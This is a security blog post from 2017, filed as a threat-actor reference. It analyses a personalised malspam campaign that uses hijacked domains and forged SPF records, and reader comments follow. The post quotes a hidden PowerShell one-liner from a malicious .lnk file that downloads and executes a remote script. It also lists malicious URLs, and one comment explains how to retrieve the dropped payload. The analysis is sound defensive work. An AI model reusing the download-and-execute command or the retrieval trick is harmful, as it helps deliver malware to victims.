# Reference for threat actor for "TA554"

**Title**: Dynamoo's Blog: Highly personalised malspam making extensive use of hijacked domains

**Source**: https://blog.dynamoo.com/2017/02/highly-personalised-malspam-making.html

## Content



















Dynamoo's Blog: Highly personalised malspam making extensive use of hijacked domains







































































Dynamoo's Blog




Malware, spam, scams and random stuff, by Conrad Longmore.




















Link List


Blogger.com
Dynamoo's Blog
Dynamoo.com
Get Updates on Twitter







































































Sponsored by..









Wednesday 15 February 2017








Highly personalised malspam making extensive use of hijacked domains







This spam email contained not only the intended victim's name, but also their home address and an apparently valid mobile telephone number:


Sent: 14 February 2017 13:52
To: [redacted]
From: <customer@localpoolrepair.com>
Subject: Mr [Redacted] Your order G29804772-064 confirmation


Dear Mr [redacted],

Thank you for placing an order with us.

For your reference your order number is G29804772-064.

Please note this is an automated email.
  Please do not reply to this email.

Get your order G29804772-064 details

Your order has been placed and items in
  stock will be sent to the address shown below. Please check all the details
  of the order to ensure they are correct as we will be unable to make changes
  once the order has been processed. You will have been notified at the point
  of order if an item is out of stock already with expected delivery date.


Delivery
  Address[address redacted][telephone number redacted]


Delivery Method:
  Standard Delivery

Your Order Information
  Prices include VAT at 20%

Customer Service Feedback
We are always working to improve the products and service we provide to our
  customers - we do this through a continual review of the product range, and
  ongoing training of our Customer Service Team. We continually strive to
  improve our levels of service and we welcome feedback from our customers
  regarding your buying experience and the product you receive.

Feefo Independent Reviews
21 days after your purchase, you will receive an email from the independent
  feedback company Feefo. It takes less than a minute to complete and we'd
  really appreciate your feedback!


IMPORTANT INFORMATION ABOUT YOUR ORDER

Delivery

Order Tracking 
Once your order has left our warehouse we will email you to confirm that the
  items have been shipped and include tracking details of the parcel so that
  you may track delivery progress directly with our courier company.

Stock Availability
On very rare occasions not every item will be available when we come to pack
  and despatch your order. If this is the case you will receive an email from
  us letting you know which items are affected and an expected delivery time.

Product Returns
All items purchased are covered by our customer friendly returns policy.
  Please visit for full details.
Thank you for placing your order with us. We really appreciate your custom
  and will do everything within our power to ensure you get the very best of
  service.

The data in the spam was identifiable as being a few years old. The intended victim does not appear on the haveibeenpwned.com database. My assumption is that this information has been harvested from an undisclosed data breach.

I was not able to extract the final payload, however the infection path is as follows:

http://bebracelet.com/customerarea/notification-processing-G29804772-064.doc
--> http://customer.abudusolicitors.com/customerarea/notification-processing-G29804772-064.doc
--> https://customer.affiliate-labs.net/customerarea/notification-processing-G29804772-064.zip

This ZIP file actually contains a .lnk file with the following Powershell command embedded in it:


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -nologo -c IEX ((New-Object Net.WebClient).DownloadString('http://cristianinho.com/lenty/reasy.ps1'));

I couldn't get a response from the server at cristianinho.com [5.152.199.228 - Redstation, UK], this looks like a possibly legitimate but hijacked domain that uses nameservers belonging to Namecheap. But that's not the only Namecheap connection, because the two "customer" subdomains are also using Namecheap hosting (for the record the subdomains are hosted on - 185.130.207.37 and 185.141.165.204 which is Host1Plus, UK / Digital Energy Technologies, DE).

Three connection to Namecheap is worrying, and certainly we've seen hijacking patterns involving other domain registrars. Or it could just be a coincidence..

The email originated from mx119.argozelo.info on 188.214.88.119 (Hzone, Romania). Just on a hunch, I checked the domain argozelo.info and it appears to be a wholly legitimate site about a Portuguese village, registered at GoDaddy hosted on Blogger. So why does it need a dedicated mail server?

Well.. this particular rabbit hole goes a little deeper. mx119 gives a clue that there might be more than one mailsever, and indeed there are 34 of the critters name mx110.argozelo.info through to mx143.argozelo.info hosted on 188.214.88.110 through 188.214.88.142. But according to Wikipedia, Argozelo only has about 700 inhabitants, so it seems unlikely that they'd need 34 mailservers in Romania.

So, my guess is that argozelo.info has also been hijacked, and hostnames set up for each of the mailservers. But we're not quite finished with this rabbit hole yet. Oh no.

What caught my eye was a mailserver on 188.214.88.110 (the same as mx110.argozelo.info) named mail.localpoolrepair.com which certainly rang a bell because the email was apparently from customer@localpoolrepair.com - yeah, OK.. the "From" in an email can be anything but this can't be a coincidence.

localpoolrepair.com appears to be a legitimate but unused GoDaddy-registered domain, hosted at an Athenix facility in the US. So why is there a mailserver in a Romanian IP block? A DIG at the records for this domain are revealing:


 Query for localpoolrepair.com type=255 class=1  localpoolrepair.com SOA (Zone of Authority)        Primary NS: dns.site5.com        Responsible person: hostmaster@site5.com        serial:2017021207        refresh:3600s (60 minutes)        retry:3600s (60 minutes)        expire:604800s (7 days)        minimum-ttl:3600s (60 minutes)  localpoolrepair.com A (Address) 143.95.232.95  localpoolrepair.com MX (Mail Exchanger) Priority: 10 mail.localpoolrepair.com  localpoolrepair.com NS (Nameserver) dns2.site5.com  localpoolrepair.com NS (Nameserver) dns.site5.com  localpoolrepair.com TXT (Text Field)    v=spf1 ip4:188.214.88.110/31 ip4:188.214.88.112/28 ip4:188.214.88.128/29 ip4:188.214.88.136/30 ip4:188.214.88.140/31 ip4:188.214.88.142/32  ~all
So.. the SPF records are valid for sending servers in the 188.214.88.110 through 188.214.88.142 range. It looks to me as if localpoolrepair.com has been hijacked and these SPF records added to it.

So we have hijacked legitimate domains with presumably a neutral or good reputation, and we have valid SPF records. This means that the spam will have decent deliverability. And then the spam itself addresses the victim by name and has personal details presumably stolen in a data breach. Could you trust yourself not to click the link?

Recommended blocklist (email)
188.214.88.0/24

Recommended blocklist (web)
 5.152.199.228185.130.207.37185.141.165.204







Posted by

Conrad Longmore



at

12:12
















Email ThisBlogThis!Share to TwitterShare to FacebookShare to Pinterest



Labels:
Data Breach,
GoDaddy,
Malware,
Romania,
Spam,
Viruses







16 comments:






kbro
said...



Good catch - received one of the critters myself today.  Main things that alerted me to it are (1) I have no pool! (2) message addressed to "Dear Mr " (3) lack of house number in address (4) confirmation for an order I know I never placed.  But the amount of personal detail is worrying.





16 February 2017 at 12:27












Dg
said...



Seems to be a new thing as I've just received one of these as well.Same issues identified as @kbro above; including for an address I haven't lived in for over 10 years.Looks like they might be harvesting domain records for these names and addresses.





16 February 2017 at 15:10












otanes
said...



The exe that is ultimately dropped is 5ca9540ca46b036d8409656a5200e1adee0f8d1bba68c045974407e20df6f710 the trick to getting that file not passing a User-Agent string. Otherwise 5.152.199.228 appears to blacklist your IP.





16 February 2017 at 16:24












Endomongo
said...



I received one of these today.  As I am not expecting anything at the moment I was suspicious and googled it. It came ostensibly from notification@localpoolrepair.com and the link to click on directed to an .xls file and the address for that was gaston-lagaffe.com. That is the name of a french cartoon character. I have deleted it and marked it as spam. It looked quite convincing with a correct address and phone number.Johnmcg





16 February 2017 at 16:40












LMFAO
said...



I had this and was dumb enough to open the account link, I know stupid. It opened to a barbecue invite page. Didn't open any files and I can't find any malware on my system. What am I missing?





16 February 2017 at 16:41












Unknown
said...



Got one of these today - thought it was a more sophisticated spam than usual and didn't open the link. Thanks for digging into this and posting the explanation - it was very interesting





16 February 2017 at 21:56












Unknown
said...



Yes - I received this today. Out of date address/phone number, but worrying all the same.thanks for the info.





16 February 2017 at 22:22












Sir Peter
said...



I received the same spamware but was suspicious as I didn't recognise the sender and I wasn't expecting a delivery. I had a look at the headers and contents in plain text.As per other posts the address details (incomplete) and phone number was years out of date. I spotted the payload was linked to an Excel file.I didn't need much more convincing that it was some type of malware. I have heard about the "Powershell in Excel file" exploit.I use email aliases extensively and the email alias spammed was one that I use in connection with motoring. Going through my email logs I have used the email alias in connection with the following site:Motorsport World  www.motorsportworld.co.ukI purchased something from the atove site in 2007 and they definitely would have my address details and telephone number. Their orginal website is no longer in place so it looks like the company no longer exists.Has anyone receiving the spamware ever frequented the above website?





17 February 2017 at 04:00












Kevin
said...



The exact thing happened to me two days ago. I unfortunately clicked on the link, & it brought up a zip file. I immediately deleted the zip file without opening it? I have run all manner of spyware & antimalware programmes, & it didn't find anything. Will my laptop be ok, with me just clicking on the link, but not opening the zip file?Any comments would be gratefully received.





17 February 2017 at 10:06












Unknown
said...



Got one today, details were address and landline phone number of property i left about 6 years ago BUT it was sent to my private e-mail address, I use two, one is a hotmail i put on anything public, internet forms, shops, cellphone or pay-TV stuff, anything public... the private one is exactly that ... or was ... only work, doctor, personal friends and family have that. Wonder where they got THAT from





17 February 2017 at 15:15












mtju74
said...



Others that i have seen:Received: from mx122.argozelo.info ([188.214.88.122])Received: from mx191.smallbatchedfoods.com (mx191.smallbatchedfoods.comReceived: from mx117.argozelo.info (mx117.argozelo.info [188.214.88.117])Received: from mx198.smallbatchedfoods.com (mx198.smallbatchedfoods.comReceived: from mx185.koobidehlife.com (mx185.koobidehlife.com [91.229.186.185])Received: from mx209.smallbatchedfoods.com (mx209.smallbatchedfoods.com [91.229.186.209])Received: from mx176.koobidehlife.com (mx176.koobidehlife.com [91.229.186.176])Senders:From: From: From: From: From: servicecustomer@killianautoservice.comFrom: noreply@glautobodyparts.comFrom: servicecustomer@killianautoservice.com





17 February 2017 at 20:36












mtju74
said...



Sorry:From: confirmation@glautobodyparts.comFrom: noreply@localpoolrepair.comFrom: services@partenaireautoplus.comFrom: no-reply@localpoolrepair.comFrom: servicecustomer@killianautoservice.comFrom: noreply@glautobodyparts.comFrom: servicecustomer@killianautoservice.com





17 February 2017 at 20:37












mtju74
said...



a few more things:this follows the first naming convention:mx155.qetradingsrl.commx156.qetradingsrl.commx157.qetradingsrl.comand so forth.also looks like they use the prefixsmtp as wellfound this example:smtp60.technologey.comsmtp61.technologey.comsmtp62.technologey.comsmtp63.technologey.comsmtp64.technologey.com





17 February 2017 at 22:11












Unknown
said...



Got the same on 14th Feb which Yahoo automatically had popped into my Spam folder.Have just found your excellent investigation of it (THANKS) which confirms an initial suspicion of my data being automatically placed into a standard email body.  When are authorities going to purge the scum who persist in trying to mug us?





19 February 2017 at 13:46












Unknown
said...



Hey folks im getting the same too, i have been working with Microsoft on this issue and have provided them with a whole bunch of screenshots showing the ping,tracert, nmap scans << lots of very juicy info there. And i am also in the process of contacting the Cyber unit at Interpol on this issue. Also i have been speaking and working with several members of the infosec community and we are having the ip addresses blacklisted, also i have noticed that the internet traffic is going though systems at BTireland so i have also contacted them and made them fully aware of it.Excellent works folks by the way!





25 February 2017 at 13:15












Helen
said...



Thank you for your investigations I have just read above.I received an almost identical email today in July 2018 - they had my name but no other personal details appeared. The body text is identical (typing it into google in ""s sent me to this page) but it is from incomstanti@coilguncapital.com . I can't find anything on basic googlesearch for coilguncapital but I wonder if it's similar to the ones above, and might have been hijacked somehow?I haven't ordered anything using this email account apart from recently signing up to Jack's Flight Club as, like a previous poster, the email address is was sent to is my work email address rather than my personal one. So I knew it was fake. Would be interested to hear if anyone else has had emails like this again recently, maybe we can work out where the data breach was from??





26 July 2018 at 11:56











Post a Comment







Newer Post


Older Post

Home




Subscribe to:
Post Comments (Atom)

















Subscribe To







Posts










                  Atom
                










Posts












Comments










                  Atom
                










Comments











Popular Posts




Websites owned by Philip John Sabin and associated companies
Apropos of nothing, all these websites are hosted on 212.230.207.100 to 213.230.207.109 (Netcalibre, UK) and appear to be owned and controll...





New Traffic Light Protocol (TLP) levels for 2018
The Traffic Light Protocol  should be familiar to anyone working with sensitive data, with levels RED, AMBER, GREEN and WHITE being used to ...










Malware spam: "New documents available for download" / service@barclaysdownloads.co.uk / barclaysdownloads.com
  This fake Barclays spam seems to lead to the Trickbot banking trojan.    From :    Barclays [service@barclaysdownloads.co.uk] Date :    10...










Updated 3NT Solutions LLP / inferno.name / V3Servers.net IP ranges (2021 edition)
It's been about a zillion years (well, OK it was 2017) when I last published a list of IPs belonging to 3NT Solutions LLP that you proba...










Naughty, naughty: BizSummits, CFO Summit, CIO Summit, CMO Summit rip off photos from other sites.
[Note, BizSummits replaced all of the unlicensed photographs shortly after I pointed them out on this blog]    I've been tracking the sp...










"Central Intelligence Agency - Case #79238516" extortion spam
  I've seen various extortion spams over the past 12 months or so, but this one has a particularly vicious twist.   If you haven't s...










Swisscoin [SIC] cryptocurrency spam
  Swisscoin is a fairly low-volume self-styled cryptocurrency that has been the target of a Necurs-based spam run starting on Saturday 13th ...










Phishing and fraudulent sites hosted on 188.241.58.60 (Qhoster)
  Nigerian registrants. Dodgy Eastern European  host offering bulletproof and anonymous hosting. Yup, I very much doubt there is anything le...










"Best porno ever" Necurs spam
  This spam (apparently from the Necurs botnet) promises much, but seems not to deliver.    From:    Susanne@victimdomain.tld [Susanne@victi...










"Thank you for registering with ImageShack." mail leads to virus
A fairly crude attempt to get clickthroughs to a virus infected site:    From: ImageShack Registration <noreply@yfrog.com>  Date: 23 J...







Blog Archive








        ► 
      



2021

(1)





        ► 
      



February

(1)









        ► 
      



2020

(1)





        ► 
      



November

(1)









        ► 
      



2019

(1)





        ► 
      



March

(1)









        ► 
      



2018

(6)





        ► 
      



May

(3)







        ► 
      



April

(1)







        ► 
      



March

(1)







        ► 
      



January

(1)









        ▼ 
      



2017

(45)





        ► 
      



December

(1)







        ► 
      



October

(5)







        ► 
      



September

(6)







        ► 
      



August

(7)







        ► 
      



July

(3)







        ► 
      



June

(2)







        ► 
      



May

(2)







        ► 
      



April

(10)







        ► 
      



March

(4)







        ▼ 
      



February

(2)

Malware spam: "RBC - Secure Message" / service@rbc...
Highly personalised malspam making extensive use o...








        ► 
      



January

(3)









        ► 
      



2016

(326)





        ► 
      



December

(10)







        ► 
      



November

(25)







        ► 
      



October

(16)







        ► 
      



September

(23)







        ► 
      



August

(15)







        ► 
      



July

(21)







        ► 
      



June

(12)







        ► 
      



May

(26)







        ► 
      



April

(23)







        ► 
      



March

(50)







        ► 
      



February

(44)







        ► 
      



January

(61)









        ► 
      



2015

(388)





        ► 
      



December

(50)







        ► 
      



November

(38)







        ► 
      



October

(40)







        ► 
      



September

(26)







        ► 
      



August

(26)







        ► 
      



July

(22)







        ► 
      



June

(23)







        ► 
      



May

(12)







        ► 
      



April

(38)







        ► 
      



March

(34)







        ► 
      



February

(39)







        ► 
      



January

(40)









        ► 
      



2014

(386)





        ► 
      



December

(25)







        ► 
      



November

(26)







        ► 
      



October

(35)







        ► 
      



September

(46)







        ► 
      



August

(31)







        ► 
      



July

(37)







        ► 
      



June

(28)







        ► 
      



May

(27)







        ► 
      



April

(23)







        ► 
      



March

(32)







        ► 
      



February

(41)







        ► 
      



January

(35)









        ► 
      



2013

(546)





        ► 
      



December

(22)







        ► 
      



November

(27)







        ► 
      



October

(36)







        ► 
      



September

(42)







        ► 
      



August

(41)







        ► 
      



July

(59)







        ► 
      



June

(41)







        ► 
      



May

(39)







        ► 
      



April

(66)







        ► 
      



March

(65)







        ► 
      



February

(60)







        ► 
      



January

(48)









        ► 
      



2012

(488)





        ► 
      



December

(48)







        ► 
      



November

(42)







        ► 
      



October

(61)







        ► 
      



September

(34)







        ► 
      



August

(38)







        ► 
      



July

(27)







        ► 
      



June

(33)







        ► 
      



May

(25)







        ► 
      



April

(55)







        ► 
      



March

(57)







        ► 
      



February

(41)







        ► 
      



January

(27)









        ► 
      



2011

(192)





        ► 
      



December

(49)







        ► 
      



November

(18)







        ► 
      



October

(23)







        ► 
      



September

(20)







        ► 
      



August

(10)







        ► 
      



July

(22)







        ► 
      



June

(18)







        ► 
      



May

(11)







        ► 
      



April

(11)







        ► 
      



March

(7)







        ► 
      



February

(3)









        ► 
      



2010

(152)





        ► 
      



December

(5)







        ► 
      



November

(7)







        ► 
      



October

(18)







        ► 
      



September

(13)







        ► 
      



August

(15)







        ► 
      



July

(32)







        ► 
      



June

(9)







        ► 
      



May

(11)







        ► 
      



April

(14)







        ► 
      



March

(2)







        ► 
      



February

(12)







        ► 
      



January

(14)









        ► 
      



2009

(130)





        ► 
      



December

(5)







        ► 
      



November

(13)







        ► 
      



October

(13)







        ► 
      



September

(5)







        ► 
      



August

(9)







        ► 
      



July

(10)







        ► 
      



June

(9)







        ► 
      



May

(13)







        ► 
      



April

(15)







        ► 
      



March

(10)







        ► 
      



February

(16)







        ► 
      



January

(12)









        ► 
      



2008

(193)





        ► 
      



December

(11)







        ► 
      



November

(16)







        ► 
      



October

(28)







        ► 
      



September

(25)







        ► 
      



August

(20)







        ► 
      



July

(22)







        ► 
      



June

(33)







        ► 
      



May

(5)







        ► 
      



April

(8)







        ► 
      



March

(11)







        ► 
      



February

(6)







        ► 
      



January

(8)









        ► 
      



2007

(52)





        ► 
      



December

(3)







        ► 
      



November

(1)







        ► 
      



October

(2)







        ► 
      



September

(3)







        ► 
      



August

(8)







        ► 
      



July

(7)







        ► 
      



May

(9)







        ► 
      



April

(6)







        ► 
      



March

(4)







        ► 
      



February

(3)







        ► 
      



January

(6)









Labels


Spam
(2119)


Viruses
(1817)


Malware
(1802)


Russia
(374)


DOC
(352)


Dridex
(305)


Scams
(234)


EXE-in-ZIP
(218)


RU:8080
(208)


Amerika
(207)


Ukraine
(171)


OVH
(167)


Locky
(162)


Ransomware
(153)


Evil Network
(146)


Germany
(137)


Job Offer Scams
(136)


Money Mule
(121)


Stupidity
(98)


France
(87)


Linode
(87)


Hetzner
(86)


SQL Injection
(83)


Lapatasker
(78)


Injection Attacks
(69)


Turkey
(68)


China
(67)


Latvia
(66)


Netherlands
(66)


GoDaddy
(61)


Canada
(59)


Dyre
(52)


Upatre
(51)


Romania
(50)


Asprox
(49)


Phishing
(45)


BBB
(43)


NACHA
(43)


Printer Spam
(42)


India
(40)


LinkedIn
(40)


Mongolia
(39)


ThreeScripts
(39)


Domains
(38)


Facebook
(38)


INTUIT
(38)


DINETHOSTING
(37)


Amazon
(35)


Banking
(35)


ADP
(32)


Bulgaria
(31)


Fake Pharma
(31)


Fax Spam
(31)


Microsoft
(31)


Scam
(29)


1&1
(28)


Korea
(28)


Nigeria
(28)


Endurance International Group
(27)


Redret
(27)


Thailand
(27)


IRS
(25)


Spain
(25)


Trojans
(25)


Lithuania
(24)


Moldova
(24)


Poland
(24)


Pump and Dump
(24)


.SU
(23)


Brazil
(23)


Fail
(23)


Italy
(23)


TheFirst-RU
(23)


Nuclear Fallout Enterprises
(22)


SMS
(22)


Malvertising
(21)


UPS
(21)


USPS
(21)


Google
(20)


eFax
(20)


Joe Job
(19)


Leaseweb
(19)


PayPal
(19)


Vietnam
(19)


Teslacrypt
(18)


Blackhole
(17)


Sweden
(17)


HMRC
(16)


Slicehost
(16)


Advanced Fee Fraud
(15)


Australia
(15)


Dating Scams
(15)


Gandi
(15)


Hungary
(15)


Phones
(15)


Serverius
(15)


Taiwan
(15)


Zbot
(15)


Angler EK
(14)


Czech Republic
(14)


PDFs
(14)


Serbia
(14)


AICPA
(12)


False Positive
(12)


PPI
(12)


Pakistan
(12)


R5X.org
(12)


South Africa
(12)


Adware
(11)


GHOSTnet
(11)


Greece
(11)


Jolly Works Hosting
(11)


NAPPPA
(11)


Somnath Bharti
(11)


US Airways
(11)


inferno.name
(11)


BizSummits
(10)


CA
(10)


Estonia
(10)


F3Y
(10)


FedEx
(10)


Intergenia
(10)


Israel
(10)


Singapore
(10)


Specialist ISP
(10)


Transnistria
(10)


security
(10)


419
(9)


CNN
(9)


Cryptowall
(9)


Porn
(9)


UAE
(9)


eTrust
(9)


Android
(8)


Apple
(8)


CyberBunker
(8)


Japan
(8)


Patches
(8)


Politics
(8)


Simply Transit
(8)


Solar VPS
(8)


Switzerland
(8)


Zerigo
(8)


Anti-Virus Software
(7)


Argentina
(7)


Black Hat
(7)


Colombia
(7)


Dropbox
(7)


Egypt
(7)


Fake Anti-Virus
(7)


Fiji
(7)


Kenya
(7)


Montenegro
(7)


Sagade Ltd
(7)


Saudi Arabia
(7)


UK2.NET
(7)


Adobe
(6)


Advertising
(6)


Appraisals
(6)


Chile
(6)


Dynamic DNS
(6)


IPMA
(6)


Institute of Project Management America
(6)


Ireland
(6)


Kazakhstan
(6)


Mystery Shopper
(6)


Netserv Consult SRL
(6)


Sky
(6)


UkrStar ISP
(6)


Voice Mail
(6)


Webazilla
(6)


Austria
(5)


Bogus Ads
(5)


Bosnia
(5)


Crime
(5)


DHL
(5)


Elstow
(5)


Google Maps
(5)


Hacked sites
(5)


Hosting
(5)


Iran
(5)


Mexico
(5)


NetTemps Inc
(5)


PestPatrol
(5)


Philippines
(5)


Piradius.net
(5)


Postini
(5)


Privacy
(5)


Sidharth Shah
(5)


Twitter
(5)


Xeex
(5)


logol.ru
(5)


BBC
(4)


Blogger
(4)


Bredolab
(4)


Bundespolizei
(4)


Cerber
(4)


Data Breach
(4)


Fake Retailers
(4)


Finance Scams
(4)


Gary McNeish
(4)


Hoax
(4)


Indonesia
(4)


Lithunia
(4)


LizaMoon
(4)


Nokia
(4)


Norway
(4)


Pony
(4)


Portugal
(4)


Senegal
(4)


Seychelles
(4)


Shifu
(4)


Spamcop
(4)


Tetrus Telecoms
(4)


TrickBot
(4)


VBScript
(4)


Weather
(4)


Zeus
(4)


.htaccess
(3)


BLNX.L
(3)


Blogging
(3)


Botnet
(3)


Dubai
(3)


Emailmovers Ltd
(3)


Etisalat
(3)


F-Secure
(3)


Finland
(3)


Firefox
(3)


Google Streetview
(3)


HostForWeb
(3)


Humour
(3)


Java
(3)


Lottery Scam
(3)


MLM
(3)


Nymaim
(3)


Passwords
(3)


Phishtank
(3)


Pizza
(3)


Police
(3)


Project Management International
(3)


SEO
(3)


Smart Roadster
(3)


Sweet Orange
(3)


Telepests
(3)


Uzbekistan
(3)


Vawtrak
(3)


Video
(3)


Voxility
(3)


Waledac
(3)


Windows
(3)


World of Warcraft
(3)


Yahoo
(3)


eBay
(3)


snow
(3)


Acid Free Coffee
(2)


AdWords
(2)


Bitcoin
(2)


Blinkx
(2)


Bob Gatchel
(2)


Botswana
(2)


CareerBuilder
(2)


Censorship
(2)


Classmates.com
(2)


Clickbank
(2)


Cloudflare
(2)


Craigslist
(2)


DDOS
(2)


Data Protection
(2)


DreamHost
(2)


Exchange
(2)


Fake Postcard
(2)


Hostfresh
(2)


Hostinger
(2)


IIS
(2)


Iframe attacks
(2)


Internet Explorer
(2)


Law
(2)


MarketBay
(2)


Maxhosting
(2)


Mobiquant
(2)


NA3PA
(2)


Nadine Dorries
(2)


Netdirekt
(2)


Neutrino
(2)


New Zealand
(2)


Nuclear EK
(2)


OpenX
(2)


PHP
(2)


Palestine
(2)


Panama
(2)


Phorm
(2)


Pinball Corporation
(2)


Pinterest
(2)


Qhoster
(2)


Retro
(2)


Samsung
(2)


Sapphire Town Real Estate
(2)


Sinowal
(2)


Slovakia
(2)


Spin
(2)


TDS
(2)


The Funding Institute
(2)


Tor
(2)


Vet
(2)


Virgin Media
(2)


Wikipedia
(2)


Yohost.org
(2)


uadomen.com
(2)


AOL
(1)


Andromeda
(1)


Art Scam
(1)


Aruba
(1)


Bedford
(1)


Bedfordshire
(1)


Belarus
(1)


Belize
(1)


Bing
(1)


Blink
(1)


Brexit
(1)


Bulgari
(1)


Computer Misuse Act
(1)


Conficker
(1)


CookieBomb
(1)


Cryptocurrency
(1)


DNS
(1)


Edis
(1)


Elections
(1)


Electronics
(1)


Email
(1)


Epsilon
(1)


Escrow
(1)


Etiquette
(1)


Extortion
(1)


Fast Serv
(1)


Fiesta EK
(1)


FirefoxOS
(1)


Friendster
(1)


Funny
(1)


Gawker
(1)


Ghana
(1)


Gogax
(1)


Gold Scam
(1)


Google Drive
(1)


Google Voice
(1)


Gumblar
(1)


HYIP
(1)


Hancitor
(1)


Hetzer
(1)


Hong Kong
(1)


Hotbar
(1)


Iceland
(1)


Infographic
(1)


Kelihos
(1)


Kidnap
(1)


LBM
(1)


LNK
(1)


Latnet
(1)


LinkShare
(1)


Luxembourg. GoDaddy
(1)


Macedonia
(1)


Macintosh
(1)


Magnitude
(1)


Malaysia
(1)


Malware Viruses
(1)


Maware
(1)


Mea Culpa
(1)


Motorola
(1)


Mozilla
(1)


Music
(1)


NATO
(1)


Najada Ltd
(1)


Nemucod
(1)


Network Operations Center
(1)


Networking4Africa.com
(1)


New Zealing
(1)


Paragon Software Group
(1)


Parcel Mule
(1)


Paul Aunger
(1)


Qatar
(1)


Relikts BVK
(1)


Robert G Allen
(1)


Rootkits
(1)


SMTP
(1)


SOCA
(1)


SOPA
(1)


Santrex
(1)


Serverconnect.se
(1)


Servia
(1)


Shifu. Malware
(1)


Skype
(1)


Slimeware
(1)


SoftLayer
(1)


Spam Scams
(1)


Spam. Malware
(1)


Spoofing
(1)


SpyEye
(1)


Symantec
(1)


Syria
(1)


Sysprep
(1)


T-Mobile
(1)


TopSites
(1)


Tunisia
(1)


Tylers Coffees
(1)


Upatre. Dyre
(1)


Vietname
(1)


Viruse
(1)


Viruses. DOC
(1)


Viruses. Dyre
(1)


Vline Ltd
(1)


WTF
(1)


Worm
(1)


XSS
(1)


YouTube
(1)


Zero Day
(1)


Zombies
(1)


ZoneAlarm
(1)


gambling
(1)


hardware
(1)


microlines.lv
(1)


pddomains.com
(1)


review
(1)


theciosummits.org
(1)




Links


Retromobe
Mobile Gazette
Petrol Direct
Slimeware
The Truth about Conrad Longmore






























































Never email donotemail@wearespammers.com . Powered by Blogger.



























